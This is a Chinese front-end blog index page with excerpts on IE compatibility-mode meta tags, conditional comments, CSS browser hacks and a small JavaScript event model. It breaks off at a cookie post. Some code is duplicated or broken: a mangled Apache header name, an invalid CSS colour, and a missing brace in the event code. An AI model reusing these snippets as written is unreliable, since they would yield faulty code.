<!DOCTYPE html>
<html>

  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <title>ZHIRUI</title>
    <meta name="description" content="">

    <link rel="shortcut icon" href="/favicon.ico?" type="image/x-icon">
    <link rel="icon" href="/favicon.ico?" type="image/x-icon">
    <link rel="stylesheet" href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css">
    <link rel="stylesheet" href="https://at.alicdn.com/t/font_8v3czwksspqlg14i.css">
    <link rel="stylesheet" href="/css/main.css ">
    <link rel="canonical" href="http://localhost:4000/">
    <link rel="alternate" type="application/rss+xml" title="ZHIRUI" href="http://localhost:4000/feed.xml ">


    <script>
    // 百度统计代码
    var _hmt = _hmt || [];
    (function() {
      var hm = document.createElement("script");
      hm.src = "//hm.baidu.com/hm.js?660cf741c8480bc7ecd6c94297066d5b";
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(hm, s);
    })();
    </script>




</head>


  <body>

    <header id="top">
    <div class="wrapper">
        <a href="/" class="brand">ZHIRUI</a>
        <small>Front-end  Engineer</small>
        <button id="headerMenu" class="menu"><i class="fa fa-bars"></i></button>
        <nav id="headerNav">
            <ul>
                <li>
                    
                    <a class="active" href="/">
                        
                        <i class="fa fa-home"></i>Home
                    </a>
                </li>

                
                    
                    <li>
                        
                        <a href="/archive/">
                        
                            <i class="fa fa-archive"></i>Archives
                        </a>
                    </li>
                    
                
                    
                    <li>
                        
                        <a href="/category/">
                        
                            <i class="fa fa-th-list"></i>Categories
                        </a>
                    </li>
                    
                
                    
                    <li>
                        
                        <a href="/tag/">
                        
                            <i class="fa fa-tags"></i>Tags
                        </a>
                    </li>
                    
                
                    
                    <li>
                        
                        <a href="/collection/">
                        
                            <i class="fa fa-bookmark"></i>Collections
                        </a>
                    </li>
                    
                
                    
                    <li>
                        
                        <a href="/demo/">
                        
                            <i class="fa fa-play"></i>Demo
                        </a>
                    </li>
                    
                
                    
                    <li>
                        
                        <a href="/about/">
                        
                            <i class="fa fa-heart"></i>About
                        </a>
                    </li>
                    
                
                    
                
                    
                
                    
                
                    
                
            </ul>
        </nav>
    </div>
</header>


        <div class="page clearfix" index>
    <div class="left">
        <h1>ZhiRui's Blog!</h1>
        <small>Living for coding the world!</small>
        <hr>
        <ul>
            
              <li>
                <h2>
                  <a class="post-link" href="/2017/03/18/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%BC%BA%E5%88%B6%E6%B8%B2%E6%9F%93/">浏览器兼容模式渲染？</a>
                </h2>
                <div class="label">
                    <div class="label-card">
                        <i class="fa fa-calendar"></i>2017-03-18
                    </div>
                    <div class="label-card">
                        
                    </div>
                    <div class="label-card">
                        
                    </div>

                    <div class="label-card">
                    


<!-- <span class="point">•</span> -->
<span class="categories">
  <i class="fa fa-th-list"></i>
  
    
        <a href="/category/#html" title="Category: html" rel="category">html</a>
    
  

  <!-- <span class="point">•</span> -->
</span>


                    </div>

                    <div class="label-card">
                    
<!-- <span class="point">•</span> -->
<span class="pageTag">
  <i class="fa fa-tags"></i>
  
    
        <a href="/tag/#html" title="Tag: html" rel="tag">html</a>&nbsp;
    
        <a href="/tag/#浏览器兼容" title="Tag: 浏览器兼容" rel="tag">浏览器兼容</a>
    
  

</span>

                    </div>
                </div>
                <div class="excerpt">
                    <ul id="markdown-toc">
  <li><a href="#前言" id="markdown-toc-前言">前言</a></li>
  <li><a href="#代码场景" id="markdown-toc-代码场景">代码场景</a></li>
  <li><a href="#常用的例子" id="markdown-toc-常用的例子">常用的例子：</a></li>
  <li><a href="#ie文档兼容性模式所有可能的值" id="markdown-toc-ie文档兼容性模式所有可能的值">IE文档兼容性模式所有可能的值：</a></li>
  <li><a href="#注意事项" id="markdown-toc-注意事项">注意事项：</a></li>
</ul>

<h1 id="前言">前言</h1>
<blockquote>
  <p>X-UA-Compatible是自从IE8新加的一个设置，对于IE8以下的浏览器是不识别的。通过在meta中设置X-UA-Compatible的值，可以指定网页的兼容性模式设置。
在网页中指定的模式优先权高于服务器中(通过HTTP Header)所指定的模式。 兼容性模式设置优先级：</p>
  <ul>
    <li>meta tag &gt; http header</li>
    <li>meta tag &gt; http header</li>
  </ul>
</blockquote>

<h1 id="代码场景">代码场景</h1>
<div class="language-html highlighter-rouge"><pre class="highlight"><code> <span class="c">&lt;!--[if IE 8]&gt;
    &lt;meta http-equiv = "X-UA-Compatible" content = "IE=7,chrome=1" /&gt;
    &lt;![endif]--&gt;</span>
    <span class="c">&lt;!--[if ! IE 8]&gt;
    &lt;meta http-equiv = "X-UA-Compatible" content = "IE=edge,chrome=1" /&gt;      
    &lt;![endif]--&gt;</span>
   
    <span class="c">&lt;!--[if lt IE 9]&gt;
      &lt;script src="Scripts/html5shiv.min.js"&gt;&lt;/script&gt;
      &lt;script src="Scripts/respond.min.js"&gt;&lt;/script&gt;
    &lt;![endif]--&gt;</span>

    <span class="nt">&lt;link</span> <span class="na">href=</span><span class="s">"Styles/style.css"</span> <span class="na">rel=</span><span class="s">"stylesheet"</span> <span class="na">type=</span><span class="s">"text/css"</span> <span class="nt">/&gt;</span> 
    <span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"Scripts/jquery.min.js"</span> <span class="na">type=</span><span class="s">"text/javascript"</span><span class="nt">&gt;&lt;/script&gt;</span>
     <span class="c">&lt;!--[if IE 8]&gt;
    &lt;meta http-equiv = "X-UA-Compatible" content = "IE=7,chrome=1" /&gt;
    &lt;![endif]--&gt;</span>
    <span class="nt">&lt;link</span> <span class="na">href=</span><span class="s">"Styles/style.css"</span> <span class="na">rel=</span><span class="s">"stylesheet"</span> <span class="na">type=</span><span class="s">"text/css"</span> <span class="nt">/&gt;</span>
    <span class="c">&lt;!--[if lt IE 9]&gt;
      &lt;script src="http://apps.bdimg.com/libs/html5shiv/3.7/html5shiv.min.js"&gt;&lt;/script&gt;
      &lt;script src="http://apps.bdimg.com/libs/respond.js/1.4.2/respond.min.js"&gt;&lt;/script&gt;
    &lt;![endif]--&gt;</span>
</code></pre>
</div>

<h1 id="常用的例子">常用的例子：</h1>
<div class="language-bash highlighter-rouge"><pre class="highlight"><code>&lt;meta http-equiv<span class="o">=</span><span class="s2">"X-UA-Compatible"</span> <span class="nv">content</span><span class="o">=</span><span class="s2">"IE=7"</span>&gt;
<span class="c">#以上代码告诉IE浏览器，无论是否用DTD声明文档标准，IE8/9都会以IE7引擎来渲染页面。  </span>
&lt;meta http-equiv<span class="o">=</span><span class="s2">"X-UA-Compatible"</span> <span class="nv">content</span><span class="o">=</span><span class="s2">"IE=8"</span>&gt;  
<span class="c">#以上代码告诉IE浏览器，IE8/9都会以IE8引擎来渲染页面。  </span>
&lt;meta http-equiv<span class="o">=</span><span class="s2">"X-UA-Compatible"</span> <span class="nv">content</span><span class="o">=</span><span class="s2">"IE=edge"</span>&gt;  
<span class="c">#以上代码告诉IE浏览器，IE8/9及以后的版本都会以最高版本IE来渲染页面。  </span>
&lt;meta http-equiv<span class="o">=</span><span class="s2">"X-UA-Compatible"</span> <span class="nv">content</span><span class="o">=</span><span class="s2">"IE=7,IE=9"</span>&gt;  
&lt;meta http-equiv<span class="o">=</span><span class="s2">"X-UA-Compatible"</span> <span class="nv">content</span><span class="o">=</span><span class="s2">"IE=7,9"</span>&gt;  
&lt;meta http-equiv<span class="o">=</span><span class="s2">"X-UA-Compatible"</span> <span class="nv">content</span><span class="o">=</span><span class="s2">"IE=Edge,chrome=1"</span>&gt;
<span class="c">#以上代码IE=edge告诉IE使用最新的引擎渲染网页，chrome=1则可以激活Chrome Frame.</span>
&lt;meta http-equiv <span class="o">=</span> <span class="s2">"X-UA-Compatible"</span> content <span class="o">=</span> <span class="s2">"IE=7"</span> &gt;   
<span class="c">#以上代码告诉IE浏览器，无论是否用DTD声明文档标准，IE8/9都会以IE7引擎来渲染页面。  </span>
&lt;meta http-equiv <span class="o">=</span> <span class="s2">"X-UA-Compatible"</span> content <span class="o">=</span> <span class="s2">"IE=8"</span> &gt;   
<span class="c">#以上代码告诉IE浏览器，IE8/9都会以IE8引擎来渲染页面。  </span>
&lt;meta http-equiv <span class="o">=</span> <span class="s2">"X-UA-Compatible"</span> content <span class="o">=</span> <span class="s2">"IE=edge"</span> &gt;   
<span class="c">#以上代码告诉IE浏览器，IE8/9及以后的版本都会以最高版本IE来渲染页面。  </span>
&lt;meta http-equiv <span class="o">=</span> <span class="s2">"X-UA-Compatible"</span> content <span class="o">=</span> <span class="s2">"IE=7,IE=9"</span> &gt;   
&lt;meta http-equiv <span class="o">=</span> <span class="s2">"X-UA-Compatible"</span> content <span class="o">=</span> <span class="s2">"IE=7,9"</span> &gt;   
&lt;meta http-equiv <span class="o">=</span> <span class="s2">"X-UA-Compatible"</span> content <span class="o">=</span> <span class="s2">"IE=Edge,chrome=1"</span> &gt;
<span class="c"># 以上代码IE = edge告诉IE使用最新的引擎渲染网页，chrome = 1则可以激活Chrome Frame .</span>
Google Chrome Frame 百科
“IE<span class="o">=</span>Edge,chrome<span class="o">=</span>1″这样简单快捷，但是弊端是代码将无法通过W3C验证。其实这并不是问题，毕竟标准只是标准，如果只有这一个“错误”完全不会有任何不良的影响。
</code></pre>
</div>

<h1 id="ie文档兼容性模式所有可能的值">IE文档兼容性模式所有可能的值：</h1>
<div class="language-bash highlighter-rouge"><pre class="highlight"><code>Emulate IE8 mode <span class="c">#指示IE使用&lt;!DOCTYPE&gt;指令来决定如何编译内容。Standards mode指令会显示成IE8 Standards mode而quirks mode会显示成IE5 mode。不同于IE8 mode，Emulate IE8 mode重视&lt;!DOCTYPE&gt;指令。</span>
Emulate IE7 mode <span class="c">#指示IE使用&lt;!DOCTYPE&gt;指令来决定如何编译内容。Standards mode指令会显示成IE7 Standards mode而quirks mode会显示成IE5 mode。不同于IE7 mode，Emulate IE7 mode重视&lt;!DOCTYPE&gt;指令。对于许多网页来说这是最推荐的兼容性模式。</span>
IE5 mode <span class="c">#编译内容如同IE7的quirks mode之显示状况，和IE5中显示的非常类似。</span>
IE7 mode <span class="c">#编译内容如同IE7的standards mode之显示状况，无论网页是否含有&lt;!DOCTYPE&gt;指令。</span>
IE8 mode <span class="c">#提供对业界标准的最高支持，包含 W3C Cascading Style Sheets Level 2.1 Specification和W3C Selectors API，并有限的支持 W3C Cascading Style Sheets Level 3 Specification (Working Draft)。</span>
Edge mode <span class="c">#指示IE以目前可用的最高模式显示内容。当使用IE8时其等同于IE8 mode。若(假定)未来放出支持更高兼容性模式的IE，使用Edge mode的页面会使用该版本能支持的最高模式来显示内容。同样的那些页面在使用IE8浏览时仍会照常显示。</span>
Emulate IE8 mode <span class="c">#指示IE使用&lt;!DOCTYPE&gt;指令来决定如何编译内容。Standards mode指令会显示成IE8 Standards mode而quirks mode会显示成IE5 mode。不同于IE8 mode，Emulate IE8 mode重视&lt;!DOCTYPE&gt;指令。</span>
Emulate IE7 mode <span class="c">#指示IE使用&lt;!DOCTYPE&gt;指令来决定如何编译内容。Standards mode指令会显示成IE7 Standards mode而quirks mode会显示成IE5 mode。不同于IE7 mode，Emulate IE7 mode重视&lt;!DOCTYPE&gt;指令。对于许多网页来说这是最推荐的兼容性模式。</span>
IE5 mode <span class="c">#编译内容如同IE7的quirks mode之显示状况，和IE5中显示的非常类似。</span>
IE7 mode <span class="c">#编译内容如同IE7的standards mode之显示状况，无论网页是否含有&lt;!DOCTYPE&gt;指令。</span>
IE8 mode <span class="c">#提供对业界标准的最高支持，包含 W3C Cascading Style Sheets Level 2.1 Specification和W3C Selectors API，并有限的支持 W3C Cascading Style Sheets Level 3 Specification (Working Draft)。</span>
Edge mode <span class="c">#指示IE以目前可用的最高模式显示内容。当使用IE8时其等同于IE8 mode。若(假定)未来放出支持更高兼容性模式的IE，使用Edge mode的页面会使用该版本能支持的最高模式来显示内容。同样的那些页面在使用IE8浏览时仍会照常显示。</span>
</code></pre>
</div>
<h1 id="注意事项">注意事项：</h1>

<ol>
  <li>根据官网定义X-UA-compatible 标头不区分大小写；不过，它必须显示在网页中除 title 元素和其他 meta 元素以外的所有其他元素之前。如果不是的话，它不起作用</li>
  <li>content的内容是IE=8，或者IE=edge等值，注意不是IE8或者直接写个edge的值，否则不起作用</li>
</ol>

<p>如果对WEb服务器了解，可以直接配置一下VirtualHost: Apache:</p>
<div class="language-apache highlighter-rouge"><pre class="highlight"><code><span class="p">&lt;</span><span class="nl">IfModule</span><span class="sr"> mod_setenvif.c</span><span class="p">&gt;
</span>  <span class="p">&lt;</span><span class="nl">IfModule</span><span class="sr"> mod_headers.c</span><span class="p">&gt;
</span>    <span class="nc">BrowserMatch</span> MSIE ie
    <span class="nc">Header</span> <span class="ss">set</span> X-UA-Compatible "IE=Edge" env=ie
    <span class="nc">BrowserMatch</span> chromeframe gcf
    <span class="nc">Header</span> <span class="ss">append</span> X-UA-Compatible "chrome=1" env=gcf
  <span class="p">&lt;/</span><span class="nl">IfModule</span><span class="p">&gt;
&lt;/</span><span class="nl">IfModule</span><span class="p">&gt;
&lt;</span><span class="nl">IfModule</span><span class="sr"> mod_setenvif.c </span><span class="p">&gt;
&lt;</span><span class="nl">IfModule</span><span class="sr"> mod_headers.c </span><span class="p">&gt;
</span><span class="nc">BrowserMatch</span> MSIE ie
<span class="nc">Header</span> <span class="ss">set</span> X - UA - Compatible "IE=Edge" <span class="ss">env</span> = ie
<span class="nc">BrowserMatch</span> chromeframe gcf
<span class="nc">Header</span> <span class="ss">append</span> X - UA - Compatible "chrome=1" <span class="ss">env</span> = gcf
<span class="p">&lt;/</span><span class="nl">IfModule</span><span class="sr"> </span><span class="p">&gt;
&lt;/</span><span class="nl">IfModule</span><span class="sr"> </span><span class="p">&gt;
</span></code></pre>
</div>

                </div>
                <div class="read-all">
                    <a  href="/2017/03/18/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%BC%BA%E5%88%B6%E6%B8%B2%E6%9F%93/"><i class="fa fa-newspaper-o"></i>Read All</a>
                </div>
                <hr>
              </li>
            
              <li>
                <h2>
                  <a class="post-link" href="/2017/03/18/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%A6%82%E4%BD%95%E6%9D%A1%E4%BB%B6%E6%B3%A8%E9%87%8A/">如何进行浏览器条件注释？</a>
                </h2>
                <div class="label">
                    <div class="label-card">
                        <i class="fa fa-calendar"></i>2017-03-18
                    </div>
                    <div class="label-card">
                        
                    </div>
                    <div class="label-card">
                        
                    </div>

                    <div class="label-card">
                    


<!-- <span class="point">•</span> -->
<span class="categories">
  <i class="fa fa-th-list"></i>
  
    
        <a href="/category/#html" title="Category: html" rel="category">html</a>
    
  

  <!-- <span class="point">•</span> -->
</span>


                    </div>

                    <div class="label-card">
                    
<!-- <span class="point">•</span> -->
<span class="pageTag">
  <i class="fa fa-tags"></i>
  
    
        <a href="/tag/#html" title="Tag: html" rel="tag">html</a>&nbsp;
    
        <a href="/tag/#浏览器兼容" title="Tag: 浏览器兼容" rel="tag">浏览器兼容</a>
    
  

</span>

                    </div>
                </div>
                <div class="excerpt">
                    <ul id="markdown-toc">
  <li><a href="#通过条件注释判断浏览器" id="markdown-toc-通过条件注释判断浏览器">通过条件注释判断浏览器</a></li>
  <li><a href="#说明" id="markdown-toc-说明">说明</a></li>
  <li><a href="#范例" id="markdown-toc-范例">范例</a></li>
</ul>

<h1 id="通过条件注释判断浏览器">通过条件注释判断浏览器</h1>
<div class="language-html highlighter-rouge"><pre class="highlight"><code><span class="c">&lt;!--[if !IE]&gt;除IE外都可识别&lt;![endif]--&gt;</span>
<span class="c">&lt;!--[if IE]&gt; 所有的IE可识别 &lt;![endif]--&gt;</span>
<span class="c">&lt;!--[if IE 6]&gt; 仅IE6可识别 &lt;![endif]--&gt;</span>
<span class="c">&lt;!--[if lt IE 6]&gt; IE6以及IE6以下版本可识别 &lt;![endif]--&gt;</span>
<span class="c">&lt;!--[if gte IE 6]&gt; IE6以及IE6以上版本可识别 &lt;![endif]--&gt;</span>
<span class="c">&lt;!--[if IE 7]&gt; 仅IE7可识别 &lt;![endif]--&gt;</span>
<span class="c">&lt;!--[if lt IE 7]&gt; IE7以及IE7以下版本可识别 &lt;![endif]--&gt;</span>
<span class="c">&lt;!--[if gte IE 7]&gt; IE7以及IE7以上版本可识别 &lt;![endif]--&gt;</span>
<span class="c">&lt;!--[if IE 8]&gt; 仅IE8可识别 &lt;![endif]--&gt;</span>
<span class="c">&lt;!--[if IE 9]&gt; 仅IE9可识别 &lt;![endif]--&gt;</span>
</code></pre>
</div>

<h1 id="说明">说明</h1>
<ol>
  <li><code class="highlighter-rouge">! ： [if !IE]</code>
    <ul>
      <li>NOT运算符。这是摆立即在前面的功能，操作员，或子表达式扭转布尔表达式的意义。</li>
    </ul>
  </li>
  <li><code class="highlighter-rouge">lt ： [if lt IE 5.5]</code>
    <ul>
      <li>小于运算符。如果第一个参数小于第二个参数，则返回true。</li>
    </ul>
  </li>
  <li><code class="highlighter-rouge">lte ：[if lte IE 6]</code>
    <ul>
      <li>小于或等于运算。如果第一个参数是小于或等于第二个参数，则返回true。</li>
    </ul>
  </li>
  <li><code class="highlighter-rouge">gt ：[if gt IE 5]</code>
    <ul>
      <li>大于运算符。如果第一个参数大于第二个参数，则返回true。</li>
    </ul>
  </li>
  <li><code class="highlighter-rouge">gte ：[if gte IE 7]</code>
    <ul>
      <li>大于或等于运算。如果第一个参数是大于或等于第二个参数，则返回true。</li>
    </ul>
  </li>
  <li><code class="highlighter-rouge">( ) ：[if !(IE 7)]</code>
    <ul>
      <li>子表达式运营商。在与布尔运算符用于创建更复杂的表达式。</li>
    </ul>
  </li>
  <li><code class="highlighter-rouge">&amp; ：[if (gt IE 5)&amp;(lt IE 7)]</code>
    <ul>
      <li>AND运算符。如果所有的子表达式计算结果为true，返回true</li>
    </ul>
  </li>
  <li><code class="highlighter-rouge">| ： if (IE 6)|(IE 7)]</code>
    <ul>
      <li>OR运算符。返回true，如果子表达式计算结果为true。</li>
    </ul>
  </li>
</ol>

<h1 id="范例">范例</h1>

<div class="language-html highlighter-rouge"><pre class="highlight"><code><span class="c">&lt;!--[if lt IE 9]&gt;
加载CSS1
&lt;!--[else]&gt;
加载CSS2
&lt;![endif]--&gt;</span>
</code></pre>
</div>
<p>这样有效是有效,但是用HTML VALIDATOR里,报错,因为这个不符合XHTML 1.1的规范,
如果把ELSE语句去掉,则正确.</p>

<p>方法：
加载CSS2</p>

<div class="language-html highlighter-rouge"><pre class="highlight"><code><span class="c">&lt;!--[if lt IE 9]&gt;
加载CSS1(可以把要重写的写在这里).
&lt;![endif]--&gt;</span>
</code></pre>
</div>


                </div>
                <div class="read-all">
                    <a  href="/2017/03/18/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%A6%82%E4%BD%95%E6%9D%A1%E4%BB%B6%E6%B3%A8%E9%87%8A/"><i class="fa fa-newspaper-o"></i>Read All</a>
                </div>
                <hr>
              </li>
            
              <li>
                <h2>
                  <a class="post-link" href="/2017/03/18/%E6%B5%8F%E8%A7%88%E5%99%A8css%E8%AF%86%E5%88%AB%E7%AC%A6/">不同浏览器的的css识别符？</a>
                </h2>
                <div class="label">
                    <div class="label-card">
                        <i class="fa fa-calendar"></i>2017-03-18
                    </div>
                    <div class="label-card">
                        
                    </div>
                    <div class="label-card">
                        
                    </div>

                    <div class="label-card">
                    


<!-- <span class="point">•</span> -->
<span class="categories">
  <i class="fa fa-th-list"></i>
  
    
        <a href="/category/#css" title="Category: css" rel="category">css</a>
    
  

  <!-- <span class="point">•</span> -->
</span>


                    </div>

                    <div class="label-card">
                    
<!-- <span class="point">•</span> -->
<span class="pageTag">
  <i class="fa fa-tags"></i>
  
    
        <a href="/tag/#css" title="Tag: css" rel="tag">css</a>&nbsp;
    
        <a href="/tag/#浏览器兼容" title="Tag: 浏览器兼容" rel="tag">浏览器兼容</a>
    
  

</span>

                    </div>
                </div>
                <div class="excerpt">
                    <ul id="markdown-toc">
  <li><a href="#不同浏览器hack的标识符" id="markdown-toc-不同浏览器hack的标识符">不同浏览器hack的标识符</a></li>
  <li><a href="#不同流浏览器的前缀" id="markdown-toc-不同流浏览器的前缀">不同流浏览器的前缀</a></li>
</ul>

<h1 id="不同浏览器hack的标识符">不同浏览器hack的标识符</h1>
<div class="language-scss highlighter-rouge"><pre class="highlight"><code><span class="nt">p</span><span class="p">{</span> <span class="nt">_color</span><span class="nd">:red</span><span class="p">;</span> <span class="p">}</span>           <span class="cm">/*IE6 专用*/</span>
<span class="o">*</span><span class="nt">html</span> <span class="nt">p</span><span class="p">{</span> <span class="nl">color</span><span class="p">:</span><span class="mh">#red</span><span class="p">;</span> <span class="p">}</span>  <span class="cm">/*IE6 专用*/</span>
<span class="nt">p</span><span class="p">{</span> <span class="o">+</span><span class="nt">color</span><span class="nd">:red</span><span class="p">;</span> <span class="p">}</span>           <span class="cm">/*IE6,7 专用*/</span>
<span class="nt">p</span><span class="p">{</span> <span class="o">*</span><span class="nt">color</span><span class="nd">:red</span><span class="p">;</span> <span class="p">}</span>           <span class="cm">/*IE6,7 专用*/</span>
<span class="o">*</span><span class="nt">html</span> <span class="nt">p</span><span class="p">{</span> <span class="nt">color</span><span class="nd">:red</span><span class="p">;</span> <span class="p">}</span>    <span class="cm">/*IE6,7 专用*/</span>
<span class="nt">p</span><span class="p">{</span> <span class="err">*+</span><span class="nl">color</span><span class="p">:</span> <span class="no">red</span><span class="p">;}</span>          <span class="cm">/*IE7 专用*/</span>
<span class="nt">Body</span><span class="o">&gt;</span> <span class="nt">p</span><span class="p">{</span> <span class="nl">color</span><span class="p">:</span> <span class="no">red</span><span class="p">;</span> <span class="p">}</span>  <span class="cm">/*屏蔽 IE6*/</span>
<span class="nt">p</span><span class="p">{</span> <span class="nt">color</span><span class="nd">:red</span><span class="err">\</span><span class="nt">9</span><span class="p">;</span> <span class="p">}</span>          <span class="cm">/*IE8*/</span>   
</code></pre>
</div>

<h1 id="不同流浏览器的前缀">不同流浏览器的前缀</h1>

<ul>
  <li>Firefox: -moz-</li>
  <li>Safari: -webkit-</li>
  <li>Opera: -o-</li>
  <li>IE: -ms-</li>
</ul>

                </div>
                <div class="read-all">
                    <a  href="/2017/03/18/%E6%B5%8F%E8%A7%88%E5%99%A8css%E8%AF%86%E5%88%AB%E7%AC%A6/"><i class="fa fa-newspaper-o"></i>Read All</a>
                </div>
                <hr>
              </li>
            
              <li>
                <h2>
                  <a class="post-link" href="/2017/03/18/%E5%AE%9E%E7%8E%B0%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84%E4%BA%8B%E4%BB%B6%E6%A8%A1%E5%9E%8B/">如何实现一个简单的事件模型？</a>
                </h2>
                <div class="label">
                    <div class="label-card">
                        <i class="fa fa-calendar"></i>2017-03-18
                    </div>
                    <div class="label-card">
                        
                    </div>
                    <div class="label-card">
                        
                    </div>

                    <div class="label-card">
                    


<!-- <span class="point">•</span> -->
<span class="categories">
  <i class="fa fa-th-list"></i>
  
    
        <a href="/category/#interview" title="Category: interview" rel="category">interview</a>
    
  

  <!-- <span class="point">•</span> -->
</span>


                    </div>

                    <div class="label-card">
                    
<!-- <span class="point">•</span> -->
<span class="pageTag">
  <i class="fa fa-tags"></i>
  
    
        <a href="/tag/#javascript" title="Tag: javascript" rel="tag">javascript</a>
    
  

</span>

                    </div>
                </div>
                <div class="excerpt">
                    <ul id="markdown-toc">
  <li><a href="#原理" id="markdown-toc-原理">原理</a></li>
  <li><a href="#实现" id="markdown-toc-实现">实现</a></li>
</ul>

<h1 id="原理">原理</h1>

<p>事件模型，就是实现事件的绑定监听。实质上就是，23种设计模式中的观察者模式（又叫发布者-订阅者模式），是最常用的设计模式之一。我们常接触的js的dom事件就是观察者模式的实现。</p>

<h1 id="实现">实现</h1>

<div class="language-javascript highlighter-rouge"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">Event</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
    <span class="kd">var</span> <span class="nx">listen</span><span class="p">,</span> <span class="nx">log</span><span class="p">,</span> <span class="nx">obj</span><span class="p">,</span> <span class="nx">one</span><span class="p">,</span> <span class="nx">remove</span><span class="p">,</span> <span class="nx">trigger</span><span class="p">,</span> <span class="nx">__this</span><span class="p">;</span>
    <span class="nx">obj</span> <span class="o">=</span> <span class="p">{};</span>
    <span class="nx">__this</span> <span class="o">=</span> <span class="k">this</span><span class="p">;</span>
    
    <span class="nx">listen</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span> <span class="nx">key</span><span class="p">,</span> <span class="nx">eventfn</span> <span class="p">)</span> <span class="p">{</span>
        <span class="kd">var</span> <span class="nx">stack</span><span class="p">,</span> <span class="nx">_ref</span><span class="p">;</span>
        <span class="nx">stack</span> <span class="o">=</span> <span class="p">(</span> <span class="nx">_ref</span> <span class="o">=</span> <span class="nx">obj</span><span class="p">[</span><span class="nx">key</span><span class="p">]</span> <span class="p">)</span> <span class="o">!=</span> <span class="kc">null</span> <span class="p">?</span> <span class="nx">_ref</span> <span class="p">:</span> <span class="nx">obj</span><span class="p">[</span> <span class="nx">key</span> <span class="p">]</span> <span class="o">=</span> <span class="p">[];</span>
        <span class="k">return</span> <span class="nx">stack</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span> <span class="nx">eventfn</span> <span class="p">);</span>
 
    <span class="p">};</span>
    
    <span class="nx">one</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span> <span class="nx">key</span><span class="p">,</span> <span class="nx">eventfn</span> <span class="p">)</span> <span class="p">{</span>
        <span class="nx">remove</span><span class="p">(</span> <span class="nx">key</span> <span class="p">);</span>
        <span class="k">return</span> <span class="nx">listen</span><span class="p">(</span> <span class="nx">key</span><span class="p">,</span> <span class="nx">eventfn</span> <span class="p">);</span> 
    <span class="p">};</span>
 
    <span class="nx">remove</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span> <span class="nx">key</span> <span class="p">)</span> <span class="p">{</span>
        <span class="kd">var</span> <span class="nx">_ref</span><span class="p">;</span>
        <span class="k">return</span> <span class="p">(</span> <span class="nx">_ref</span> <span class="o">=</span> <span class="nx">obj</span><span class="p">[</span><span class="nx">key</span><span class="p">]</span> <span class="p">)</span> <span class="o">!=</span> <span class="kc">null</span> <span class="p">?</span> <span class="nx">_ref</span><span class="p">.</span><span class="nx">length</span> <span class="o">=</span> <span class="mi">0</span> <span class="p">:</span> <span class="k">void</span> <span class="mi">0</span><span class="p">;</span>
 
    <span class="p">};</span>
 
    <span class="nx">trigger</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
        <span class="kd">var</span> <span class="nx">fn</span><span class="p">,</span> <span class="nx">stack</span><span class="p">,</span> <span class="nx">_i</span><span class="p">,</span> <span class="nx">_len</span><span class="p">,</span> <span class="nx">_ref</span><span class="p">,</span> <span class="nx">key</span><span class="p">;</span>
        <span class="nx">key</span> <span class="o">=</span> <span class="nb">Array</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">shift</span><span class="p">.</span><span class="nx">call</span><span class="p">(</span> <span class="nx">arguments</span> <span class="p">);</span> 
        <span class="nx">stack</span> <span class="o">=</span> <span class="p">(</span> <span class="nx">_ref</span> <span class="o">=</span> <span class="nx">obj</span><span class="p">[</span> <span class="nx">key</span> <span class="p">]</span> <span class="p">)</span> <span class="o">!=</span> <span class="kc">null</span> <span class="p">?</span> <span class="nx">_ref</span> <span class="p">:</span> <span class="nx">obj</span><span class="p">[</span> <span class="nx">key</span> <span class="p">]</span> <span class="o">=</span> <span class="p">[];</span>
        
        <span class="k">for</span> <span class="p">(</span> <span class="nx">_i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="nx">_len</span> <span class="o">=</span> <span class="nx">stack</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">_i</span> <span class="o">&lt;</span> <span class="nx">_len</span><span class="p">;</span> <span class="nx">_i</span><span class="o">++</span> <span class="p">)</span> <span class="p">{</span>
            <span class="nx">fn</span> <span class="o">=</span> <span class="nx">stack</span><span class="p">[</span> <span class="nx">_i</span> <span class="p">];</span>
            <span class="k">if</span> <span class="p">(</span> <span class="nx">fn</span><span class="p">.</span><span class="nx">apply</span><span class="p">(</span> <span class="nx">__this</span><span class="p">,</span>  <span class="nx">arguments</span> <span class="p">)</span> <span class="o">===</span> <span class="kc">false</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>  
 
    <span class="k">return</span> <span class="p">{</span>
       <span class="na">listen</span><span class="p">:</span> <span class="nx">listen</span><span class="p">,</span>
       <span class="na">one</span><span class="p">:</span> <span class="nx">one</span><span class="p">,</span>
       <span class="na">remove</span><span class="p">:</span> <span class="nx">remove</span><span class="p">,</span>
       <span class="na">trigger</span><span class="p">:</span> <span class="nx">trigger</span>
       <span class="p">}</span>
<span class="p">}</span>
</code></pre>
</div>

                </div>
                <div class="read-all">
                    <a  href="/2017/03/18/%E5%AE%9E%E7%8E%B0%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84%E4%BA%8B%E4%BB%B6%E6%A8%A1%E5%9E%8B/"><i class="fa fa-newspaper-o"></i>Read All</a>
                </div>
                <hr>
              </li>
            
              <li>
                <h2>
                  <a class="post-link" href="/2017/03/18/%E5%A6%82%E4%BD%95%E6%93%8D%E4%BD%9Ccookie/">如何操作cookie？</a>
                </h2>
                <div class="label">
                    <div class="label-card">
                        <i class="fa fa-calendar"></i>2017-03-18
                    </div>
                    <div class="label-card">
                        
                    </div>
                    <div class="label-card">
                        
                    </div>

